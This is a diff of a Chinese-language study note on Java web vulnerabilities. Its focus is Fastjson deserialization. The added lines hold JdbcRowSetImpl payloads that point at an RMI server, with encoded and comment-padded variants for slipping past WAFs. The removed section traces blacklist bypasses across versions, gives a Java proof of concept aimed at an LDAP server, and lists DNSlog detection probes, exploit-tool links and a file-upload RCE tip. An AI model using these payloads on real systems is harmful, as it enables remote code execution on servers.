+        { "@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}
+        {/*p1g3*/"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}
+        {\n"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}
+        {"@type"\b:"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}
+        {"\u0040\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit
+        ":true}
+         {"\x40\x74\x79\x70\x65":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}
+        ```
+
+- 不管是对键还是对值，都可以⽤ unicode 以及⼗六进制的⽅式进⾏Bypass，特别的，这对于⼀些只ban @type 的WAF尤为好⽤。
+
+-  对于这种⽅式的绕过，是因为Fastjson内部会进⾏⼀些去除、解码的操作，所以不看源码肯定是不知道的，所以我个⼈建议⼤家在学习某个漏洞时，还是要对源 码进⾏调试⼀下，调试的过程中不仅能加深对某个漏洞的理解，也能了解该漏洞的调⽤过程，对个⼈来说是有⾮常⼤的好处的。
 
 ##### **fastjson版本探测：**
 
@@ -5592,7 +7764,7 @@ public class Test {
 
         - 想办法使其触发一个延迟。可以执行Java的sleep代码，可以像mysql注入那样计算一个公式bench.mark(5000000,m.d5( 'test' ))，也可以发起一个轻微的DoS请求。
 
-        -  **jndi请求延迟**
+        - **jndi请求延迟**
 
             - 适用于1.2.47之前版本的fastjson
 
@@ -5621,166 +7793,37 @@ public class Test {
 - ```json
     #报错：
     {"@type": "java.lang.AutoCloseable"
-  `["test":1]` 
-  {
-  
-  #DNS
-  #以下POC出网，说明fastjson<=1.2.47
-  {"name":{"@type":"java.net.InetAddress","val":"1247.xxxxx.dnslog.cn"}}
-  #以下这个POC出网，说明fastjson>=1.2.37
-  {{"@type":"java.net.URL","val":"http://weffewfddd.dnslog.cn"}:"aaa"}
-  #以下这个POC出网，证明fastjson版本号1.1.16<=version<=1.2.24
-  {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxxdsf.dnslog.cn:9999/POC","autoCommit":true}}
-  
-  #以下这几个POC，只能证明fastjson出网，无法判断fastjson是否存在反序列化漏洞，因为最新的打了补丁的fastjson也是能发起DNS请求的。这是很多新手，误以为能DNS出网，就认为存在fastjson漏洞，这是不正确的。
-  {"@type":"java.net.Inet6Address","val":"sdffsd.dnslog.cn"}
-  {"@type":"java.net.Inet4Address","val":"xxxxx.dnslog.cn"}
-  {"@type":"java.net.InetSocketAddress"{"address":,"val":"wefewffw.dnslog.cn"}}
-  
-  #以下这个POC比较不错，是之前从天眼设备上抓到的，实战中用一用会有意想不到的效果。
-  {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://allmet.dnslog.cn"}}""}
-  Set[{"@type":"java.net.URL","val":"http://allmet.dnslog.cn"}]
-  Set[{"@type":"java.net.URL","val":"http://allmet.dnslog.cn"}
-  {{"@type":"java.net.URL","val":"http://allmet.dnslog.cn"}:0
-  
-  ```
+    `["test":1]` 
+    {
+    
+    #DNS
+    #以下POC出网，说明fastjson<=1.2.47
+    {"name":{"@type":"java.net.InetAddress","val":"1247.xxxxx.dnslog.cn"}}
+    #以下这个POC出网，说明fastjson>=1.2.37
+    {{"@type":"java.net.URL","val":"http://weffewfddd.dnslog.cn"}:"aaa"}
+    #以下这个POC出网，证明fastjson版本号1.1.16<=version<=1.2.24
+    {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxxdsf.dnslog.cn:9999/POC","autoCommit":true}}
+    
+    #以下这几个POC，只能证明fastjson出网，无法判断fastjson是否存在反序列化漏洞，因为最新的打了补丁的fastjson也是能发起DNS请求的。这是很多新手，误以为能DNS出网，就认为存在fastjson漏洞，这是不正确的。
+    {"@type":"java.net.Inet6Address","val":"sdffsd.dnslog.cn"}
+    {"@type":"java.net.Inet4Address","val":"xxxxx.dnslog.cn"}
+    {"@type":"java.net.InetSocketAddress"{"address":,"val":"wefewffw.dnslog.cn"}}
+    
+    #以下这个POC比较不错，是之前从天眼设备上抓到的，实战中用一用会有意想不到的效果。
+    {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://allmet.dnslog.cn"}}""}
+    Set[{"@type":"java.net.URL","val":"http://allmet.dnslog.cn"}]
+    Set[{"@type":"java.net.URL","val":"http://allmet.dnslog.cn"}
+    {{"@type":"java.net.URL","val":"http://allmet.dnslog.cn"}:0
+    
+    ```
 
-##### **Fastjson  1.2.22 - 1.2.24 RCE **
+##### fastjson poc总结
 
-- FastJson在 1.2.22 - 1.2.24 版本中存在反序列化漏洞，主要原因FastJson⽀持的两个特性： fastjson反序列化时，JSON字符串中的 @type 字段，⽤来表明指定反序列化的⽬标恶意对象类。
+> https://github.com/safe6Sec/Fastjson  poc
+>
+> https://github.com/a1phaboy/FastjsonScan.git   fastjson利用工具
 
--  fastjson反序列化时，字符串时会⾃动调⽤恶意对象的构造⽅法， setter ⽅法， getter ⽅法， 若这类⽅法中存在利⽤点，即可完成漏洞利⽤
 
-- **主要存在两种利⽤⽅式：**
-
-    -  JdbcRowSetImpl(JNDI) 
-    - TemplatesImpl(Feature.SupportNonPublicField)，限制太大，要求原来的代码，传入了Feature.SupportNonPublicField。
-
-- **JNDI && JdbcRowSetImpl利⽤链：**
-
-    - jndi利用对jdk版本是有限制的。
-
-    - poc：
-
-        - ```java
-            package org.example;
-            
-            import com.alibaba.fastjson.JSON;
-            public class java1_2_24 {
-                public static void main(String[] args) {
-                    String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.50.183:1389/8kk9hw\", \"autoCommit\":true}";
-                    JSON.parse(PoC);
-                }
-            }
-            ```
-
-        - @type ：指定恶意利⽤类为 com.sun.rowset.JdbcRowSetImpl 
-
-        - dataSourceName ：指定 RMI / LDAP 恶意服务器，并调⽤ setDataSourceName 函数 
-
-        - autoCommit ：调⽤ setAutoCommit 函数。
-
-##### fastjson不出网如何利用
-
-- https://www.cnblogs.com/R0ser1/p/15918626.html#%E5%89%8D%E8%A8%80
-- BCEL可以
-
-##### 1.2.25-1.2.41
-
-- 官⽅在1.2.25版本更新中，对1.2.25-1.2.41版本漏洞进⾏了修补。新增了 autoTypeSupport 反序列化 选项，并通过 checkAutoType 函数对加载类进⾏⿊⽩名单过滤和判断。
-
-- **autoTypeSupport选项**
-
-    - 1.2.25版本默认情况下， autoTypeSupport 为 false ，默认使⽤⿊名单 +⽩名单验证
-
-        - 在默认的 `AutoTypeSupport为False`时，要求不匹配到黑名单，**同时必须匹配到白名单的class才可以成功加载**，**白名单默认为空**。错误就报 `"autoType is not support. " + typeName`
-
-        - `AutoTypeSupport为True`时候会匹配黑名单。错误就报 `"autoType is not support. " + typeName`
-
-- 1.2.25-1.2.41绕过:
-
-    - 所以接下来所谓的绕过都是在服务端显性开启 `AutoTypeSupport为True`的情况下进行的。（这是一个很大的限制条件）
-
-    - 黑名单
-
-        - ```java
-            denyList = {String[22]@620}
-            0 = "bsh"
-            1 = "com.mchange"
-            2 = "com.sun."
-            3 = "java.lang.Thread"
-            4 = "java.net.Socket"
-            5 = "java.rmi"
-            6 = "javax.xml"
-            7 = "org.apache.bcel"
-            8 = "org.apache.commons.beanutils"
-            9 = "org.apache.commons.collections.Transformer"
-            10 = "org.apache.commons.collections.functors"
-            11 = "org.apache.commons.collections4.comparators"
-            12 = "org.apache.commons.fileupload"
-            13 = "org.apache.myfaces.context.servlet"
-            14 = "org.apache.tomcat"
-            15 = "org.apache.wicket.util"
-            16 = "org.codehaus.groovy.runtime"
-            17 = "org.hibernate"
-            18 = "org.jboss"
-            19 = "org.mozilla.javascript"
-            20 = "org.python.core"
-            21 = "org.springframework"
-            ```
-
-    - 在指定的类名开头加上 L ，结尾加上 ; ，能够成功绕过⿊名单的验证，问题出 在 TypeUtils.loadClass 。
-
-##### 1.2.42安全补丁
-
-- 开发者为了增加安全分析的难度，将⿊名单中的类明⽂变成了类Hash进⾏⽐较判断。 /com/alibaba/fastjson/parser/ParserConfig.java
-- 不过已经不需要⾃⼰去折腾了，github已经[有项⽬](https://github.com/LeadroyaL/fastjson-blacklist)汇总了类名-类Hash之间的对应关
-- 过滤：
-    - 在将类名传⼊⿊名单判断前，对开头和结尾的字符进⾏⼀次删除。
-- 绕过：
-    - 绕过⽅式为类名开头两个 L ，结尾两个 ; ，这样删除⼀次开头结尾后的类名 为 Lcom.sun.rowset.JdbcRowSetImpl; ，不会触发⿊名单。 前⽂提到 TypeUtils.loadClass 会递归的去掉开头 L 和结尾 ; ，传⼊ TypeUtils.loadClass 函数的 类名是 LLcom.sun.rowset.JdbcRowSetImpl;; （其实 LLLcom.sun.rowset.JdbcRowSetImpl;;; 也⾏），因此最终也能加载 com.sun.rowset.JdbcRowSetImpl 。
-
-##### 1.2.43安全补丁
-
-- 先判断类名是否符合 L----; 形式（ LL-----;; 以及多次重复也判断符合），若符合，则进⼀步精确判 断类名是否为 LL-----;; 形式：
-    -  符合，就直接抛出异常，这⾥就过滤了两次及以上的开头和结尾的攻击类名。 
-    - 不符合，处理同上版本，删除开头和结尾的字符得到类名，传⼊⿊名单判断。 后续的处理和前⾯版本基本相似。
-- 根据POC可知，绕过⽅式不再使⽤ L----; 类型，⽽是使⽤ TypeUtils.loadClass 函数中对类名以 [ 开头的处理进⾏绕过，并且变化了 [{ ，为了反序列化解析的时候不会产⽣异常。
-
-##### 1.2.44-1.2.45安全补丁:
-
-- 修复了1.2.43版本中 autoTypeSupport为 true时，恶意类名前添加 [的引发安全问题，但仍存在绕过
-  ⻛险。
-- 对 com.sun.rowset.JdbcRowSetImpl 类的利⽤陷⼊了困境，于是诞⽣了有⼀定限制的新 Mybatis 利 ⽤链，可以直接绕过⿊名单。
-
-##### 1.2.46-1.2.47安全补丁
-
-- 补丁：
-    - 把ibatis加入黑名单
-- 绕过：
-    - 主要使⽤了 checkAutoType 函数处理逻辑上的⼀些缺陷并结合新的 java.lang.Class 利⽤链，利⽤ 缓存 mappings 从⽽绕过了⿊⽩名单的限制加载 com.sun.rowset.JdbcRowSetImpl 类。
-    - **通杀payload！: 无需AutoTypeSupport，没有黑白名单要求。**
-
-##### fastjson<=1.2.68：
-
-- expectClass绕过AutoType）
-
-  - 这是一条任意文件写入的利用链(不受autotype限制), 而写入一个jsp文件放在现在的大多数情况下并不能够被解析, 而且也不知道要写在哪个位置, 难以利用.
-  - 之前版本的fastjson RCE都是通过JNDI注入执行恶意代码, 受限于jdk版本; 而这条利用链根据LandGrey师傅收集的jdk目录与分享的利用代码, 推测是几乎很少受到限制, 但可能对应不同的场景仍需要一些小改动.
-- 修复方式简单粗暴，将java.lang.Runnable，java.lang.Readable和java.lang.AutoCloseable加 入了黑名单
-- 并且从这个版本(1.2.68)开始，Fastjson 引入了safeMode功能，完全禁用autoType。所有的安全修复版本sec10也支持SafeMode配置。
-- 代码中设置开启SafeMode如下：
-
-  ```java
-  ParserConfig.getGlobalInstance().setSafeMode(true);
-  ```
-
-  开启之后，就完全禁用AutoType即 `@type`了，这样就能防御住Fastjson反序列化漏洞了。
-
-##### Fastjson 1.2.80 及之前版本存在 Throwable 反序列化漏洞
-
-- Fastjson 1.2.80 及之前版本使用黑白名单用于防御反序列化漏洞，经研究该防御策略在特定条件下可绕过默认 autoType 关闭限制，攻击远程服务器，风险影响较大。建议 Fastjson 用户尽快采取安全措施保障系统安全。
-- 暂无poc
 
 ## java web常见漏洞
 
@@ -6318,6 +8361,18 @@ private boolean uploadWithAnnotation(HttpServletRequest request, HttpServletResp
 ```
 
 可以看到这种方法代码比较简洁，需要注意的是要在类前面加`@MultipartConfig`这个注解，否则会报错。
+
+##### 文件上传利用
+
+无jsp环境下文件上传利用
+
+>  https://wx.zsxq.com/mweb/views/topicdetail/topicdetail.html?topic_id=182452148288452&group_id=2212251881&inviter_id=421128451825228
+>
+>  https://www.wangan.com/articles/2954#433531
+>
+>  https://www.cnblogs.com/wh4am1/p/14681335.html
+
+**覆盖charsets.jar进行RCE，但是会影响原本项目的运行。**
 
 #### 文件操作（下载/读取/删除）
 
